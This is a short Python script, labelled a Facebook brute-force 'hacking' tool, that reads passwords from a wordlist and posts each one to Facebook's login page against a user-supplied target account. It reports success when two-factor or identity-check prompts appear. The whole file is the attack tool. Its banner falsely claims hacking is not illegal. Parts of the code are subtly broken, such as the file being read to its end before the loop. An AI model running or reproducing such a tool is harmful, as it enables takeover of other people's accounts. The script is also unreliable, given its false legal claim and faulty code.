import requests
header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',}
url = "https://www.facebook.com/login.php"
cookie={}
pass_file = open('password.txt','r')

class color():
    def __init__(self,gl,blu,read,yel,):
        self.gl = gl
        self.blu = blu
        self.read = read
        self.yel = yel
cl = color('\033[1;32;50m','\033[1;34;50m','\033[1;31;50m','\033[1;33;50m')

def tool_dc():
    print(cl.yel,"author by : kwee thite")
    print(cl.yel,"tool name : fb-bf")
    print(cl.gl,"tool type :hacking")
    print(cl.read,"Warning: hacking is not Illegal \n       this tool is only for education \n")

def cookie_requests():
    l = requests.get(url)
    for i in l.cookies:
        cookie[i.name] = i.value
        return cookie

def login(username,pw):
    cookie = cookie_requests()
    pload ={'user':username}
    pload['pass'] =pw
    login = requests.post(url,data=pload,headers=header,cookies=cookie)
    if 'Please comfirm your identity' in login.text or 'Find Friends' in login.text or 'security code' in login.text or 'Two-factor authentication' in login.text:
        print('Password found :'+pw)
        return True
    else:
        print("false password :",pw)
        return False

l = len(pass_file.readlines())
c = 0
tool_dc()
username = input("Enter your Target Username or mail : ")
while pass_file:
        if c == l:
            print("sorry password not found \n you can edit password.txt file ")
            break
        c += 1
        pw = pass_file.readline().strip()
        if len(pw) < 6:
            continue
        if login(username,pw):
            break

